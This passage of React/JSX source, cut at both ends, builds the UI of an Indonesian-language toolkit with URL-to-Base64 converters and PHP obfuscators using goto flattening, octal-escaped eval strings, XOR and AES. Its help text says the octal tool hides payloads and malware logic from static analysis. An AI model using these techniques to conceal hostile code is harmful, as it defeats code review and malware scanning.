                                  onClick={handleB64Decode22}
                                  className="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold py-2 px-4 rounded-lg transition text-xs cursor-pointer"
                                >
                                  Base64 → URL
                                </button>
                              </div>

                              {outputURL_22 && (
                                <motion.div
                                  initial={{ opacity: 0 }}
                                  animate={{ opacity: 1 }}
                                  className="space-y-1.5"
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] text-slate-500 font-mono">Hasil URL murni:</span>
                                    <button
                                      onClick={() => handleCopy(outputURL_22, 'outputURL_22')}
                                      className="text-[10px] text-slate-400 hover:text-emerald-400 flex items-center gap-0.5"
                                    >
                                      {copiedId === 'outputURL_22' ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                                      <span>Disalin</span>
                                    </button>
                                  </div>
                                  <input
                                    readOnly
                                    type="text"
                                    value={outputURL_22}
                                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-[11px] text-slate-300 font-mono focus:outline-none"
                                  />
                                </motion.div>
                              )}
                            </div>

                          </div>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 4: URL ↔ Base64 (gacor44) */}
                    {activeTab === 'url_b64_44' && (
                      <motion.div
                        key="url_b64_44"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Link className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">🔐 URL ↔ Base64 Converter (gacor44)</h2>
                                <p className="text-xs text-slate-400">Konverter dua arah dari URL murni ke Base64 dan sebaliknya.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Key className="h-3 w-3 text-emerald-400" />
                              <span>gacor44 Scope</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* URL TO BASE64 SECTION */}
                            <div className="bg-slate-950/60 p-5 rounded-xl border border-slate-800/80 space-y-4">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block font-mono">
                                🟢 URL ke Base64
                              </span>
                              <div className="space-y-2">
                                <input
                                  type="text"
                                  value={urlInput44}
                                  onChange={(e) => setUrlInput44(e.target.value)}
                                  placeholder="Masukkan URL (mis. https://google.com)"
                                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3 py-2 text-slate-200 font-mono text-xs focus:outline-none focus:border-emerald-500"
                                />
                                <button
                                  onClick={handleUrlEncode44}
                                  className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-semibold py-2 px-4 rounded-lg transition text-xs cursor-pointer"
                                >
                                  URL → Base64
                                </button>
                              </div>

                              {outputB64_44 && (
                                <motion.div
                                  initial={{ opacity: 0 }}
                                  animate={{ opacity: 1 }}
                                  className="space-y-1.5"
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] text-slate-500 font-mono">Hasil Base64:</span>
                                    <button
                                      onClick={() => handleCopy(outputB64_44, 'outputB64_44')}
                                      className="text-[10px] text-slate-400 hover:text-emerald-400 flex items-center gap-0.5"
                                    >
                                      {copiedId === 'outputB64_44' ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                                      <span>Disalin</span>
                                    </button>
                                  </div>
                                  <textarea
                                    readOnly
                                    value={outputB64_44}
                                    className="w-full h-16 bg-slate-950 border border-slate-800 rounded-lg p-2 text-[11px] text-slate-300 font-mono focus:outline-none resize-none"
                                  />
                                </motion.div>
                              )}
                            </div>

                            {/* BASE64 TO URL SECTION */}
                            <div className="bg-slate-950/60 p-5 rounded-xl border border-slate-800/80 space-y-4">
                              <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block font-mono">
                                🔵 Base64 ke URL
                              </span>
                              <div className="space-y-2">
                                <textarea
                                  value={b64Input44}
                                  onChange={(e) => setB64Input44(e.target.value)}
                                  placeholder="Masukkan string Base64 di sini..."
                                  className="w-full h-10 bg-slate-950 border border-slate-800 rounded-lg p-2 text-slate-200 font-mono text-xs focus:outline-none focus:border-emerald-500 resize-none"
                                />
                                <button
                                  onClick={handleB64Decode44}
                                  className="w-full bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-semibold py-2 px-4 rounded-lg transition text-xs cursor-pointer"
                                >
                                  Base64 → URL
                                </button>
                              </div>

                              {outputURL_44 && (
                                <motion.div
                                  initial={{ opacity: 0 }}
                                  animate={{ opacity: 1 }}
                                  className="space-y-1.5"
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="text-[10px] text-slate-500 font-mono">Hasil URL murni:</span>
                                    <button
                                      onClick={() => handleCopy(outputURL_44, 'outputURL_44')}
                                      className="text-[10px] text-slate-400 hover:text-emerald-400 flex items-center gap-0.5"
                                    >
                                      {copiedId === 'outputURL_44' ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
                                      <span>Disalin</span>
                                    </button>
                                  </div>
                                  <input
                                    readOnly
                                    type="text"
                                    value={outputURL_44}
                                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-[11px] text-slate-300 font-mono focus:outline-none"
                                  />
                                </motion.div>
                              )}
                            </div>

                          </div>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 5: URL BASE64 ENCODER (ONLY) */}
                    {activeTab === 'url_encoder' && (
                      <motion.div
                        key="url_encoder"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Code className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">🔐 URL to Base64 Encoder (Only)</h2>
                                <p className="text-xs text-slate-400">Enkoder URL ke format Base64 murni.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Key className="h-3 w-3 text-emerald-400" />
                              <span>gacor44 Scope</span>
                            </div>
                          </div>

                          <div className="space-y-4">
                            <div className="space-y-2">
                              <label className="block text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                Masukkan URL Anda:
                              </label>
                              <input
                                type="text"
                                value={urlInput5}
                                onChange={(e) => setUrlInput5(e.target.value)}
                                placeholder="Masukkan URL Anda di sini (misal: https://google.com)"
                                className="w-full bg-slate-950 border border-slate-800 rounded-lg px-4 py-2.5 text-slate-200 font-mono text-sm focus:outline-none focus:ring-1 focus:ring-emerald-500"
                              />
                            </div>

                            <button
                              onClick={handleUrlEncode5}
                              className="w-full bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold py-2.5 px-4 rounded-lg transition cursor-pointer text-sm"
                            >
                              Convert to Base64
                            </button>

                            {outputB64_5 && (
                              <motion.div
                                initial={{ opacity: 0, y: 5 }}
                                animate={{ opacity: 1, y: 0 }}
                                className="space-y-2 pt-4 border-t border-slate-800"
                              >
                                <div className="flex items-center justify-between">
                                  <label className="block text-xs font-semibold text-slate-400 uppercase tracking-wider font-mono">
                                    Hasil Enkode Base64:
                                  </label>
                                  <button
                                    onClick={() => handleCopy(outputB64_5, 'outputB64_5')}
                                    className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                  >
                                    {copiedId === 'outputB64_5' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                    <span>{copiedId === 'outputB64_5' ? 'Disalin' : 'Salin'}</span>
                                  </button>
                                </div>
                                <textarea
                                  readOnly
                                  value={outputB64_5}
                                  placeholder="Hasil Base64 akan muncul di sini"
                                  className="w-full h-24 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-300 font-mono text-sm focus:outline-none resize-none"
                                />
                              </motion.div>
                            )}
                          </div>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 6: PHP GOTO OBFUSCATOR & DEOBFUSCATOR */}
                    {activeTab === 'php_goto' && (
                      <motion.div
                        key="php_goto"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Sparkles className="h-5 w-5 text-emerald-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Goto Obfuscator & Deobfuscator</h2>
                                <p className="text-xs text-slate-400">Control-flow flattening menggunakan langkah acak goto statement dan double Base64.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Sparkles className="h-3 w-3 text-emerald-400" />
                              <span>PHP Goto Tool</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* GOTO INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Goto (Input / Obfuscated)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {gotoInput && (
                                    <button
                                      onClick={() => handleCopy(gotoInput, 'gotoInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'gotoInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'gotoInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setGotoInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={gotoInput}
                                onChange={(e) => setGotoInput(e.target.value)}
                                placeholder={`goto lbl_abc12;\n\nlbl_abc12:\n$g_parts[0] = "WlhK";\ngoto lbl_xyz34;\n...`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-emerald-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleGotoDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>Goto Obfuscated → PHP biasa</span>
                              </button>
                            </div>

                            {/* GOTO OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decode / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {gotoOutput && (
                                    <button
                                      onClick={() => handleCopy(gotoOutput, 'gotoOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'gotoOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'gotoOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setGotoOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={gotoOutput}
                                onChange={(e) => setGotoOutput(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk diobfuscate..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleGotoEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → Goto Obfuscated</span>
                              </button>
                            </div>

                          </div>

                          {gotoError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{gotoError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Petunjuk Obfuscation format `PHP Goto`
                          </h4>
                          <p>
                            Alat ini memecah file PHP Anda menjadi array base64 terfragmentasi, menghasilkan label `goto` unik, mengacak tata letak fisik baris program, lalu menghubungkannya kembali dengan instruksi jump `goto`.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Setiap fragment base64 ditugaskan ke elemen array di bawah label terpisah secara asinkron.</li>
                            <li>Garis instruksi dilompati menggunakan operator PHP <code className="text-amber-500">goto</code> dalam urutan logis yang benar saat dijalankan, namun tampak berantakan dan tidak terbaca secara visual.</li>
                            <li>Sangat andal untuk mencegah analisis kode statis secara kasat mata.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 7: PHP OCTAL OBFUSCATOR & DEOBFUSCATOR */}
                    {activeTab === 'php_octal' && (
                      <motion.div
                        key="php_octal"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Terminal className="h-5 w-5 text-amber-500" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP Octal Obfuscator & Deobfuscator</h2>
                                <p className="text-xs text-slate-400">Transformasi karakter kode PHP biasa menjadi representasi escape sequence octal native PHP.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Terminal className="h-3 w-3 text-amber-500" />
                              <span>PHP Octal</span>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* OCTAL INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Octal (Input / Obfuscated)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {octalInput && (
                                    <button
                                      onClick={() => handleCopy(octalInput, 'octalInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'octalInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'octalInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setOctalInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={octalInput}
                                onChange={(e) => setOctalInput(e.target.value)}
                                placeholder={`eval("\\145\\166\\141\\154\\050\\142\\141\\163\\145...");`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-amber-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleOctalDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>Octal Obfuscated → PHP biasa</span>
                              </button>
                            </div>

                            {/* OCTAL OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decode / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {octalOutput && (
                                    <button
                                      onClick={() => handleCopy(octalOutput, 'octalOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'octalOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'octalOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setOctalOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={octalOutput}
                                onChange={(e) => setOctalOutput(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk diobfuscate..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleOctalEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → Octal Obfuscated</span>
                              </button>
                            </div>

                          </div>

                          {octalError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{octalError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-emerald-400" />
                            Petunjuk Obfuscation format `PHP Octal`
                          </h4>
                          <p>
                            Alat ini mengonversi setiap karakter dari source program PHP Anda ke dalam representasi byte escape octal (berbasis 8) yang valid untuk interpretasi internal PHP string.
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Setiap karakter dikonversi menjadi baris berpola <code className="text-amber-500">\ooo</code> (seperti karakter 'e' bernilai <code className="text-amber-500">\145</code>).</li>
                            <li>PHP mengevaluasi string octal secara otomatis dalam tanda kutip ganda pada pemanggilan fungsi <code className="text-amber-500">eval()</code>.</li>
                            <li>Sangat andal untuk menyembunyikan string sensitif, keyword, payload, maupun malware logic dari pembacaan kasat mata dan analisis string statis.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 8: PHP XOR CIPHER OBFUSCATOR & DEOBFUSCATOR */}
                    {activeTab === 'php_xor' && (
                      <motion.div
                        key="php_xor"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Key className="h-5 w-5 text-cyan-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP XOR Cipher Encryptor & Decryptor</h2>
                                <p className="text-xs text-slate-400">Enkripsi simetris bitwise XOR dengan Custom Secret Key untuk melindungi integritas source code.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Key className="h-3 w-3 text-cyan-400" />
                              <span>PHP XOR</span>
                            </div>
                          </div>

                          {/* KEY CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-3">
                            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Konfigurasi XOR Secret Key</h3>
                            <div className="grid grid-cols-1 gap-4">
                              <div className="space-y-1.5">
                                <label className="text-[11px] text-slate-400 font-mono">Kunci Enkripsi (XOR Secret Key)</label>
                                <input
                                  type="text"
                                  value={xorKey}
                                  onChange={(e) => setXorKey(e.target.value)}
                                  placeholder="Ketik kunci rahasia XOR..."
                                  className="w-full bg-slate-900 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-cyan-500"
                                />
                              </div>
                            </div>
                          </div>

                          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            
                            {/* XOR INPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Kode PHP Terenkripsi XOR (Input)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {xorInput && (
                                    <button
                                      onClick={() => handleCopy(xorInput, 'xorInput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'xorInput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'xorInput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setXorInput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={xorInput}
                                onChange={(e) => setXorInput(e.target.value)}
                                placeholder={`$k = "secret";\n$d = "WlhKbGMyVnljM1FnYVdS...";\n...`}
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-cyan-400 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-cyan-500 focus:border-cyan-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleXorDecode}
                                className="w-full bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Unlock className="h-4 w-4" />
                                <span>XOR Ciphertext → PHP biasa</span>
                              </button>
                            </div>

                            {/* XOR OUTPUT COLUMN */}
                            <div className="space-y-2">
                              <div className="flex items-center justify-between">
                                <label className="text-xs font-semibold text-slate-300 uppercase tracking-wider font-mono">
                                  Hasil Decrypt / Source (PHP biasa)
                                </label>
                                <div className="flex items-center space-x-2">
                                  {xorOutput && (
                                    <button
                                      onClick={() => handleCopy(xorOutput, 'xorOutput')}
                                      className="text-xs text-slate-400 hover:text-emerald-400 flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-emerald-500/30 transition cursor-pointer"
                                    >
                                      {copiedId === 'xorOutput' ? <Check className="h-3.5 w-3.5 text-emerald-400" /> : <Copy className="h-3.5 w-3.5" />}
                                      <span>{copiedId === 'xorOutput' ? 'Disalin' : 'Salin'}</span>
                                    </button>
                                  )}
                                  <button
                                    onClick={() => setXorOutput('')}
                                    className="text-xs text-slate-500 hover:text-slate-300 bg-slate-950 px-2 py-1 rounded border border-slate-800 hover:border-slate-700 transition cursor-pointer"
                                  >
                                    Bersihkan
                                  </button>
                                </div>
                              </div>

                              <textarea
                                value={xorOutput}
                                onChange={(e) => setXorOutput(e.target.value)}
                                placeholder="Hasil PHP biasa / ketik source code di sini untuk di-encrypt..."
                                className="w-full h-80 bg-slate-950 border border-slate-800 rounded-lg p-3 text-slate-200 font-mono text-xs focus:outline-none focus:ring-1 focus:ring-emerald-500 focus:border-emerald-500 placeholder-slate-700 resize-none leading-relaxed"
                              />

                              <button
                                onClick={handleXorEncode}
                                className="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 font-semibold py-2.5 px-4 rounded-lg transition-all duration-150 active:scale-[0.99] flex items-center justify-center space-x-2 cursor-pointer text-sm"
                              >
                                <Lock className="h-4 w-4" />
                                <span>PHP biasa → XOR Encrypted</span>
                              </button>
                            </div>

                          </div>

                          {xorError && (
                            <motion.div
                              initial={{ opacity: 0 }}
                              animate={{ opacity: 1 }}
                              className="mt-6 flex items-center space-x-2 bg-red-500/10 border border-red-500/20 text-red-400 px-3 py-2.5 rounded-lg text-xs font-mono"
                            >
                              <ShieldAlert className="h-4 w-4" />
                              <span>{xorError}</span>
                            </motion.div>
                          )}
                        </div>

                        {/* DOCUMENTATION PANEL */}
                        <div className="bg-slate-900/40 border border-slate-800 rounded-xl p-5 text-xs text-slate-400 space-y-2">
                          <h4 className="font-bold text-slate-300 flex items-center gap-1">
                            <Info className="h-4 w-4 text-cyan-400" />
                            Petunjuk Enkripsi `PHP XOR Cipher`
                          </h4>
                          <p>
                            Alat ini mengaplikasikan cipher XOR bitwise simetris pada representasi biner program PHP Anda dengan secret key secara berulang (cycled key XOR cipher).
                          </p>
                          <ul className="list-disc list-inside space-y-1 pl-1 text-slate-500 font-mono">
                            <li>Proses enkripsi menghasilkan data biner terenkripsi yang dibungkus dengan <code className="text-amber-500">base64_encode()</code> agar aman dalam representasi teks PHP.</li>
                            <li>Runtime decryptor diinjeksikan secara inline untuk mengonversi byte XOR kembali secara otomatis saat file dijalankan oleh web server.</li>
                            <li>Tingkat kekuatan perlindungan sangat ditentukan oleh panjang dan keunikan kunci yang Anda gunakan.</li>
                          </ul>
                        </div>
                      </motion.div>
                    )}

                    {/* TAB 9: PHP AES-256-CBC ENCRYPTOR & DECRYPTOR */}
                    {activeTab === 'php_aes' && (
                      <motion.div
                        key="php_aes"
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                      >
                        <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-6 backdrop-blur-md">
                          <div className="flex items-center justify-between border-b border-slate-800 pb-4 mb-6">
                            <div className="flex items-center space-x-3">
                              <Lock className="h-5 w-5 text-indigo-400" />
                              <div>
                                <h2 className="text-lg font-bold text-white">PHP AES-256-CBC Encryptor & Decryptor</h2>
                                <p className="text-xs text-slate-400">Enkripsi militer simetris AES-256 (Advanced Encryption Standard) dengan mode Cipher Block Chaining.</p>
                              </div>
                            </div>
                            <div className="text-xs text-slate-500 font-mono flex items-center space-x-1 bg-slate-950 px-2 py-1 rounded border border-slate-800">
                              <Lock className="h-3 w-3 text-indigo-400" />
                              <span>PHP AES-256-CBC</span>
                            </div>
                          </div>

                          {/* KEY & IV CONFIGURATION */}
                          <div className="bg-slate-950 p-4 rounded-xl border border-slate-800/80 mb-6 space-y-4">
                            <h3 className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Konfigurasi AES Parameters</h3>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                              <div className="space-y-1.5">
                                <label className="text-[11px] text-slate-400 font-mono">AES Encryption Key (32 Chars)</label>
                                <input
                                  type="text"
                                  value={aesKey}
                                  onChange={(e) => setAesKey(e.target.value)}
                                  placeholder="Kunci AES-256..."
                                  className="w-full bg-slate-900 border border-slate-800 rounded px-3 py-1.5 text-xs text-slate-100 font-mono focus:outline-none focus:border-indigo-500"
                                />
                              </div>
                              <div className="space-y-1.5">
                                <label className="text-[11px] text-slate-400 font-mono">Initialization Vector (IV) (16 Chars)</label>
